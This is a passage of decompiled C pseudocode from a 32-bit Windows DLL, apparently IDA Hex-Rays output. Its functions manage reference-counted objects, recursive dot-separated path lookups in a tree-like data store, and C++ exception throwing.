  LOBYTE(v16) = 0;
  sub_10016B53(v10);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1002B023: using guessed type int var_34[5];

//----- (1002B11F) --------------------------------------------------------
_DWORD *__stdcall sub_1002B11F(_DWORD *a1, void *Block, int a3, volatile LONG *lpAddend)
{
  _DWORD *v4; // edi
  volatile LONG *v5; // eax
  int v6; // ecx
  volatile LONG *v8; // [esp-8h] [ebp-28h] BYREF
  int v9; // [esp-4h] [ebp-24h]
  volatile LONG **v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+1Ch] [ebp-4h]
  _DWORD *Blocka; // [esp+2Ch] [ebp+Ch]

  v4 = 0;
  v11 = 0;
  v5 = lpAddend;
  v6 = a3;
  *a1 = 0;
  v9 = (int)v5;
  a1[2] = v5;
  a1[1] = v6;
  InterlockedIncrement((volatile LONG *)v9);
  sub_1002B444(a1 + 3);
  v9 = 52;
  a1[5] = 0;
  a1[6] = Block;
  Blocka = operator new(v9);
  LOBYTE(v11) = 3;
  if ( Blocka )
  {
    v8 = (volatile LONG *)v9;
    v10 = &v8;
    sub_1000CE26(&v8, (int)&unk_100BF7AC);
    LOBYTE(v11) = 3;
    v4 = sub_1002B55A(Blocka, (int)a1, (int)v8, v9);
  }
  LOBYTE(v11) = 2;
  sub_1002B4FB(a1 + 3, (int)v4);
  v11 = -1;
  sub_10019BCB((void **)&a3);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002B1C2) --------------------------------------------------------
_DWORD *__stdcall sub_1002B1C2(int a1, _DWORD *a2)
{
  volatile LONG *v2; // ecx

  v2 = *(volatile LONG **)(a1 + 16);
  a2[1] = v2;
  *a2 = *(_DWORD *)(a1 + 12);
  InterlockedIncrement(v2);
  return a2;
}

//----- (1002B1FF) --------------------------------------------------------
LONG __thiscall sub_1002B1FF(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  volatile LONG *v5; // ecx
  volatile LONG *v6; // ecx
  int *v7; // edi
  volatile LONG *v9; // [esp-8h] [ebp-44h] BYREF
  volatile LONG *v10; // [esp-4h] [ebp-40h]
  volatile LONG **v11; // [esp+14h] [ebp-28h]
  int v12[6]; // [esp+18h] [ebp-24h] BYREF
  int v13; // [esp+38h] [ebp-4h]

  v3 = 0;
  this[5] = a2;
  if ( a2 )
    *(_DWORD *)(a2 + 16) = 0;
  v4 = this[5];
  if ( v4 )
    v3 = *(_DWORD *)(*(_DWORD *)(v4 + 24) + 28);
  sub_10016AE9((_DWORD *)(this[1] + 4), (int)v12);
  v13 = 0;
  sub_10016E93(v12, 0, v3);
  sub_10016B2F(v12, this[1] + 4);
  v10 = v5;
  v9 = v5;
  v10 = (volatile LONG *)this[2];
  v6 = (volatile LONG *)this[1];
  v11 = &v9;
  v9 = v6;
  InterlockedIncrement(v10);
  LOBYTE(v13) = 1;
  v7 = (int *)this[6];
  LOBYTE(v13) = 0;
  sub_1002E554(v7, v9, v10);
  v13 = -1;
  return sub_10016B53(v12);
}
// 1002B279: variable 'v5' is possibly undefined
// 1002B1FF: using guessed type int var_24[6];

//----- (1002B2CC) --------------------------------------------------------
int *__thiscall sub_1002B2CC(_DWORD *this, int *a2, int a3, int a4, int *a5)
{
  void *v6; // eax
  int v7; // ecx
  _DWORD *v8; // eax
  int v10; // [esp-10h] [ebp-44h] BYREF
  int v11; // [esp-Ch] [ebp-40h]
  int *v12; // [esp-8h] [ebp-3Ch]
  int v13; // [esp-4h] [ebp-38h]
  _DWORD v14[2]; // [esp+10h] [ebp-24h] BYREF
  int v15; // [esp+18h] [ebp-1Ch]
  int v16; // [esp+1Ch] [ebp-18h] BYREF
  void *Block; // [esp+20h] [ebp-14h]
  int v18; // [esp+30h] [ebp-4h]

  v15 = 0;
  v18 = 2;
  v6 = operator new(0x28u);
  v7 = v13;
  Block = v6;
  if ( v6 )
  {
    v13 = this[5];
    v12 = a5;
    v11 = v7;
    v10 = v7;
    a5 = &v10;
    sub_1000CE26(&v10, (int)&a3);
    LOBYTE(v18) = 2;
    a5 = sub_1002AAFD(Block, (int)this, v10, v11, v12, v13);
  }
  else
  {
    a5 = 0;
  }
  LOBYTE(v18) = 1;
  sub_1002B4BC(a2, (int)a5);
  v15 = 1;
  LOBYTE(v18) = 4;
  sub_10012A7C(&v16, (int)&a3);
  LOBYTE(v18) = 5;
  v8 = sub_1002B1C2((int)this, v14);
  LOBYTE(v18) = 6;
  sub_1002B965((_DWORD *)*v8, (int)&v16, a2, 0);
  LOBYTE(v18) = 5;
  sub_10019C27(v14);
  LOBYTE(v18) = 4;
  sub_10012AAC(&v16);
  v18 = 1;
  sub_1002B1FF(this, (int)a5);
  ++*this;
  LOBYTE(v18) = 0;
  sub_1000CE59(&a3);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1002B2CC: using guessed type _DWORD var_24[2];

//----- (1002B3C0) --------------------------------------------------------
LONG __userpurge sub_1002B3C0@<eax>(int a1@<esi>, int a2, int a3)
{
  int v3; // edi
  int v5[5]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v6 = 0;
  if ( sub_1000D0B5((int)&unk_100BF7AC, (int)&a2) )
  {
    sub_10012A7C(v5, (int)&a2);
    LOBYTE(v6) = 1;
    v3 = sub_1002BC6C(*(_DWORD **)(a1 + 12), (int)v5, 0);
    LOBYTE(v6) = 0;
    sub_10012AAC(v5);
  }
  else
  {
    v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 12) + 4))(*(_DWORD *)(a1 + 12));
  }
  *(_DWORD *)a1 -= v3;
  v6 = -1;
  return sub_1000CE59(&a2);
}
// 1002B3C0: using guessed type int var_18[5];

//----- (1002B444) --------------------------------------------------------
_DWORD *__usercall sub_1002B444@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002B4BC) --------------------------------------------------------
_DWORD *__userpurge sub_1002B4BC@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002B4FB) --------------------------------------------------------
void __usercall sub_1002B4FB(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10019DD8((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002B55A) --------------------------------------------------------
_DWORD *__stdcall sub_1002B55A(_DWORD *a1, int a2, int a3, int a4)
{
  int v5; // [esp+0h] [ebp-28h] BYREF
  _DWORD *v6; // [esp+4h] [ebp-24h]
  int *v7; // [esp+18h] [ebp-10h]
  int v8; // [esp+24h] [ebp-4h]

  v8 = 0;
  v7 = &v5;
  sub_1000CE26(&v5, (int)&a3);
  LOBYTE(v8) = 0;
  sub_10035420(a1, a2, v5, (int)v6);
  LOBYTE(v8) = 2;
  v6 = a1 + 4;
  *a1 = &off_10094BB0;
  sub_1002CE9F(v6);
  v8 = -1;
  sub_1000CE59(&a3);
  return a1;
}
// 10094BB0: using guessed type int (__thiscall *off_10094BB0)(void *Block, char);

//----- (1002B5B8) --------------------------------------------------------
int *__thiscall sub_1002B5B8(int *Block, char a2)
{
  sub_1002B5D8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002B5D8) --------------------------------------------------------
LONG __stdcall sub_1002B5D8(int *a1)
{
  sub_1002CEE4(a1 + 4);
  return sub_1002A992(a1);
}

//----- (1002B606) --------------------------------------------------------
_DWORD *__stdcall sub_1002B606(_DWORD *a1, _DWORD *a2, int a3, int a4)
{
  int *v4; // eax
  _DWORD v6[2]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v7[2]; // [esp+18h] [ebp-20h] BYREF
  int v8[2]; // [esp+20h] [ebp-18h] BYREF
  int v9; // [esp+28h] [ebp-10h]
  int v10; // [esp+34h] [ebp-4h]

  v9 = 0;
  v10 = 1;
  sub_10012A7C(v8, (int)&a3);
  LOBYTE(v10) = 2;
  sub_1002B444(v6);
  LOBYTE(v10) = 3;
  v4 = sub_1002B729(a1, v7, (int)v8, 2, 0);
  LOBYTE(v10) = 4;
  sub_1002D12D(v4, a2);
  v9 = 1;
  LOBYTE(v10) = 3;
  sub_10001651(v7);
  LOBYTE(v10) = 2;
  sub_10019C27(v6);
  LOBYTE(v10) = 1;
  sub_10012AAC(v8);
  LOBYTE(v10) = 0;
  sub_1000CE59(&a3);
  return a2;
}
// 1002B606: using guessed type _DWORD var_28[2];
// 1002B606: using guessed type _DWORD var_20[2];

//----- (1002B697) --------------------------------------------------------
_DWORD *__stdcall sub_1002B697(_DWORD *a1, _DWORD *a2, int a3, int a4)
{
  int *v4; // eax
  _DWORD v6[2]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v7[2]; // [esp+18h] [ebp-20h] BYREF
  int v8[2]; // [esp+20h] [ebp-18h] BYREF
  int v9; // [esp+28h] [ebp-10h]
  int v10; // [esp+34h] [ebp-4h]

  v9 = 0;
  v10 = 1;
  sub_10012A7C(v8, (int)&a3);
  LOBYTE(v10) = 2;
  sub_1002B4BC(v6, 0);
  LOBYTE(v10) = 3;
  v4 = sub_1002B729(a1, v7, (int)v8, 1, 0);
  LOBYTE(v10) = 4;
  sub_1002D166(v4, a2);
  v9 = 1;
  LOBYTE(v10) = 3;
  sub_10001651(v7);
  LOBYTE(v10) = 2;
  sub_10019D52(v6);
  LOBYTE(v10) = 1;
  sub_10012AAC(v8);
  LOBYTE(v10) = 0;
  sub_1000CE59(&a3);
  return a2;
}
// 1002B697: using guessed type _DWORD var_28[2];
// 1002B697: using guessed type _DWORD var_20[2];

//----- (1002B729) --------------------------------------------------------
_DWORD *__thiscall sub_1002B729(_DWORD *this, _DWORD *a2, int a3, int a4, int a5)
{
  _DWORD *v6; // edi
  int *v7; // eax
  int v8; // esi
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD v12[2]; // [esp+10h] [ebp-30h] BYREF
  int v13[2]; // [esp+18h] [ebp-28h] BYREF
  int v14[2]; // [esp+20h] [ebp-20h] BYREF
  int v15; // [esp+28h] [ebp-18h] BYREF
  volatile LONG *v16; // [esp+2Ch] [ebp-14h]
  int v17; // [esp+30h] [ebp-10h]
  int v18; // [esp+3Ch] [ebp-4h]
  int v19; // [esp+54h] [ebp+14h]

  v19 = sub_1000D869(a5, a3, 0x2Eu);
  sub_10001611(a2);
  v18 = 0;
  v17 = 1;
  if ( v19 == -1 )
  {
    sub_1000CE26(&v15, a3);
    v18 = 1;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, &v15) )
    {
      v6 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(this[4] + 20))(this + 4, &v15);
      sub_1002C9BB(a2, v6);
    }
    LOBYTE(v18) = 0;
    sub_1000CE59(&v15);
  }
  else
  {
    sub_1000D2DE(a3, 0, v14, v19);
    v18 = 2;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v14) )
    {
      v7 = (int *)(*(int (__thiscall **)(_DWORD *, int *))(this[4] + 20))(this + 4, v14);
      v16 = (volatile LONG *)v7[1];
      v15 = *v7;
      v8 = v15;
      InterlockedIncrement(v16);
      LOBYTE(v18) = 3;
      if ( (*(int (__thiscall **)(int))(*(_DWORD *)v8 + 8))(v8) == 2 )
      {
        sub_1002B444(v12);
        LOBYTE(v18) = 4;
        sub_1002D12D(&v15, v13);
        LOBYTE(v18) = 6;
        sub_10019C27(v12);
        v9 = (_DWORD *)sub_1002B729(v12, a3, a4, v19 + 1);
        LOBYTE(v18) = 7;
        sub_1002C9BB(a2, v9);
        LOBYTE(v18) = 6;
        sub_10001651(v12);
        LOBYTE(v18) = 3;
        sub_10019C27(v13);
      }
      LOBYTE(v18) = 2;
      sub_10001651(&v15);
    }
    LOBYTE(v18) = 0;
    sub_1000CE59(v14);
  }
  if ( *a2 && a4 && (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*a2 + 8))(*a2) != a4 )
  {
    v10 = sub_10001611(v12);
    v18 = 8;
    sub_1002C9BB(a2, v10);
    LOBYTE(v18) = 0;
    sub_10001651(v12);
  }
  return a2;
}
// 1002B729: using guessed type _DWORD var_30[2];

//----- (1002B8C4) --------------------------------------------------------
bool __stdcall sub_1002B8C4(_DWORD *a1, int a2, int a3, int a4)
{
  _DWORD *v4; // eax
  _DWORD v6[2]; // [esp+10h] [ebp-20h] BYREF
  int v7[5]; // [esp+18h] [ebp-18h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]
  bool v9; // [esp+3Fh] [ebp+Fh]

  v8 = 0;
  sub_10012A7C(v7, (int)&a3);
  LOBYTE(v8) = 1;
  v4 = sub_1002B729(a1, v6, (int)v7, a2, 0);
  LOBYTE(v8) = 2;
  v9 = *v4 != 0;
  LOBYTE(v8) = 1;
  sub_10001651(v6);
  LOBYTE(v8) = 0;
  sub_10012AAC(v7);
  v8 = -1;
  sub_1000CE59(&a3);
  return v9;
}
// 1002B8C4: using guessed type int var_18[5];
// 1002B8C4: using guessed type _DWORD var_20[2];

//----- (1002B934) --------------------------------------------------------
int __thiscall sub_1002B934(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[4] + 44))(this + 4, a2);
  return a2;
}

//----- (1002B965) --------------------------------------------------------
LONG __thiscall sub_1002B965(_DWORD *this, int a2, int *a3, int a4)
{
  int v5; // eax
  _DWORD *v6; // ebx
  _DWORD *v7; // edi
  _DWORD *v8; // eax
  _DWORD *v9; // ebx
  _DWORD *v10; // eax
  _DWORD *v11; // edi
  _DWORD *v12; // eax
  int *v13; // ecx
  int *v14; // eax
  _DWORD *v15; // eax
  int v17; // [esp-Ch] [ebp-50h]
  int v18; // [esp-8h] [ebp-4Ch] BYREF
  int v19; // [esp-4h] [ebp-48h]
  _DWORD *pExceptionObject[2]; // [esp+10h] [ebp-34h] BYREF
  int v21; // [esp+18h] [ebp-2Ch]
  int *v22; // [esp+1Ch] [ebp-28h] BYREF
  volatile LONG *v23; // [esp+20h] [ebp-24h]
  int v24[2]; // [esp+24h] [ebp-20h] BYREF
  int v25[3]; // [esp+2Ch] [ebp-18h] BYREF
  int v26; // [esp+40h] [ebp-4h]

  v5 = sub_1000D869(a4, a2, 0x2Eu);
  v21 = v5;
  if ( v5 == -1 )
  {
    sub_1000CE26(v25, a2);
    v26 = 0;
    v6 = this + 4;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v25) )
      goto LABEL_3;
    sub_10001611(&v22);
    LOBYTE(v26) = 1;
    v7 = sub_1002D19F(a3, v24);
    LOBYTE(v26) = 2;
    v8 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v6 + 16))(v6, v25);
    sub_1002C9BB(v8, v7);
    LOBYTE(v26) = 1;
    sub_10001651(v24);
    LOBYTE(v26) = 0;
    sub_10001651(&v22);
  }
  else
  {
    sub_1000D2DE(a2, 0, v25, v5);
    v26 = 3;
    sub_1002B444(v24);
    LOBYTE(v26) = 4;
    v9 = this + 4;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v25) )
    {
      v14 = (int *)(*(int (__thiscall **)(_DWORD *, int *))(*v9 + 16))(this + 4, v25);
      v23 = (volatile LONG *)v14[1];
      v22 = (int *)*v14;
      InterlockedIncrement(v23);
      LOBYTE(v26) = 9;
      if ( (*(int (__thiscall **)(int *))(*v22 + 8))(v22) == 1 )
      {
LABEL_3:
        sub_1001668F(pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
      }
      v15 = sub_1002D12D((int *)&v22, pExceptionObject);
      LOBYTE(v26) = 10;
      sub_10019C52(v24, v15);
      LOBYTE(v26) = 9;
      sub_10019C27(pExceptionObject);
      LOBYTE(v26) = 4;
      v13 = (int *)&v22;
    }
    else
    {
      pExceptionObject[0] = operator new(0x34u);
      LOBYTE(v26) = 5;
      if ( pExceptionObject[0] )
      {
        v18 = v19;
        v22 = &v18;
        sub_1000CE26(&v18, (int)v25);
        LOBYTE(v26) = 6;
        v17 = this[3];
        LOBYTE(v26) = 5;
        v10 = sub_1002B55A(pExceptionObject[0], v17, v18, v19);
      }
      else
      {
        v10 = 0;
      }
      LOBYTE(v26) = 4;
      sub_1002B4FB(v24, (int)v10);
      sub_10001611(pExceptionObject);
      LOBYTE(v26) = 7;
      v11 = sub_1002D1D8(v24, &v22);
      LOBYTE(v26) = 8;
      v12 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v9 + 16))(v9, v25);
      sub_1002C9BB(v12, v11);
      LOBYTE(v26) = 7;
      sub_10001651(&v22);
      LOBYTE(v26) = 4;
      v13 = (int *)pExceptionObject;
    }
    sub_10001651(v13);
    sub_1002B965(a2, a3, v21 + 1);
    LOBYTE(v26) = 3;
    sub_10019C27(v24);
  }
  v26 = -1;
  return sub_1000CE59(v25);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1002B965: using guessed type int var_18[3];

//----- (1002BBDD) --------------------------------------------------------
int __thiscall sub_1002BBDD(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // ebx
  unsigned int i; // edi
  _DWORD *v4; // eax
  int v6; // [esp+14h] [ebp-20h] BYREF
  unsigned int v7; // [esp+18h] [ebp-1Ch]
  int v8; // [esp+30h] [ebp-4h]

  v1 = this + 4;
  v2 = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(this[4] + 48))(this + 4, &v6);
  v8 = 0;
  for ( i = 0; i < v7; ++i )
  {
    v4 = (_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v6 + 44))(&v6, i);
    v2 += (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v4 + 4))(*v4);
  }
  (*(void (__thiscall **)(_DWORD *))(*v1 + 24))(v1);
  v8 = -1;
  sub_1002CA30(&v6);
  return v2;
}

//----- (1002BC6C) --------------------------------------------------------
int __thiscall sub_1002BC6C(_DWORD *this, int pExceptionObject, int a3)
{
  int v4; // esi
  int v5; // edi
  _DWORD *v6; // esi
  _DWORD *v8; // eax
  int v9; // edi
  _DWORD *v10; // ebx
  _DWORD *v11; // eax
  int *v12; // eax
  int v13[2]; // [esp+10h] [ebp-28h] BYREF
  int v14[2]; // [esp+18h] [ebp-20h] BYREF
  int v15; // [esp+20h] [ebp-18h] BYREF
  _DWORD *v16; // [esp+24h] [ebp-14h]
  int v17; // [esp+34h] [ebp-4h]

  v16 = this;
  v4 = pExceptionObject;
  v5 = sub_1000D869(a3, pExceptionObject, 0x2Eu);
  if ( v5 == -1 )
  {
    sub_1000CE26(v14, v4);
    v17 = 0;
    v6 = this + 4;
    if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v14) )
    {
LABEL_3:
      v17 = -1;
      sub_1000CE59(v14);
      return 0;
    }
    v8 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v6 + 16))(this + 4, v14);
    v9 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v8 + 4))(*v8);
    (*(void (__thiscall **)(_DWORD *, int *))(*v6 + 12))(this + 4, v14);
  }
  else
  {
    sub_1000D2DE(v4, 0, v14, v5);
    v17 = 1;
    v10 = v16 + 4;
    if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(v16[4] + 8))(v16 + 4, v14) )
      goto LABEL_3;
    v11 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v10 + 16))(v10, v14);
    if ( (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v11 + 8))(*v11) != 2 )
    {
      sub_1001668F(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
    }
    sub_1002B444(&v15);
    LOBYTE(v17) = 2;
    v12 = (int *)(*(int (__thiscall **)(_DWORD *, int *))(*v10 + 16))(v10, v14);
    sub_1002D12D(v12, v13);
    LOBYTE(v17) = 4;
    sub_10019C27(&v15);
    v9 = sub_1002BC6C(pExceptionObject, v5 + 1);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)(v13[0] + 16) + 28))(v13[0] + 16) )
      (*(void (__thiscall **)(_DWORD *, int *))(*v10 + 12))(v10, v14);
    LOBYTE(v17) = 1;
    sub_10019C27(v13);
  }
  v17 = -1;
  sub_1000CE59(v14);
  return v9;
}

//----- (1002BDB5) --------------------------------------------------------
int sub_1002BDB5()
{
  return 2;
}

//----- (1002BDB9) --------------------------------------------------------
int __thiscall sub_1002BDB9(int this, int a2)
{
  sub_100024C0((void *)(this + 4), a2);
  return a2;
}

//----- (1002BDEA) --------------------------------------------------------
int __thiscall sub_1002BDEA(int this, int a2)
{
  sub_1002C423((void *)(this + 20), a2);
  return a2;
}

//----- (1002BE1B) --------------------------------------------------------
_DWORD *__thiscall sub_1002BE1B(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x20u);
  if ( v3 )
    v4 = sub_1002C495(v3, (int)this);
  else
    v4 = 0;
  sub_1002D295(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002BE6B) --------------------------------------------------------
void __thiscall sub_1002BE6B(_DWORD *this)
{
  *this = &off_10094BF4;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094BF4: using guessed type int (__thiscall *off_10094BF4)(void *Block, char);

//----- (1002BE90) --------------------------------------------------------
BOOL __thiscall sub_1002BE90(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1002BEA9) --------------------------------------------------------
_DWORD *__thiscall sub_1002BEA9(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1002C5A8(this, v3, 0);
  else
    v4 = 0;
  sub_1002D313(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002BEFC) --------------------------------------------------------
_DWORD *__thiscall sub_1002BEFC(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1002C712(this, v3, 0);
  else
    v4 = 0;
  sub_1002D225(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002BF4F) --------------------------------------------------------
_DWORD *__thiscall sub_1002BF4F(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1002C5A8(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1002D313(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002BFAA) --------------------------------------------------------
_DWORD *__thiscall sub_1002BFAA(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1002C712(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1002D225(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002C005) --------------------------------------------------------
_DWORD *__thiscall sub_1002C005(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1002C5A8(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1002D313(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002C07A) --------------------------------------------------------
_DWORD *__thiscall sub_1002C07A(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1002C712(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1002D225(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002C0EF) --------------------------------------------------------
void __thiscall sub_1002C0EF(_DWORD *this)
{
  *this = &off_10094CC4;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094CC4: using guessed type int (__thiscall *off_10094CC4)(void *Block, char);

//----- (1002C114) --------------------------------------------------------
int *__thiscall sub_1002C114(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1002C456(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1002C16A: variable 'v5' is possibly undefined

//----- (1002C17C) --------------------------------------------------------
int *__thiscall sub_1002C17C(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1002C3F2(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1002C1D2: variable 'v5' is possibly undefined

//----- (1002C1E4) --------------------------------------------------------
void __thiscall sub_1002C1E4(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1002D352(v2);
}

//----- (1002C21C) --------------------------------------------------------
void __thiscall sub_1002C21C(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1002D352(v3);
}

//----- (1002C257) --------------------------------------------------------
void __thiscall sub_1002C257(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1002D352(v2);
}

//----- (1002C28F) --------------------------------------------------------
int __thiscall sub_1002C28F(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1002D264(v4);
  return v2;
}

//----- (1002C2CB) --------------------------------------------------------
int __thiscall sub_1002C2CB(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

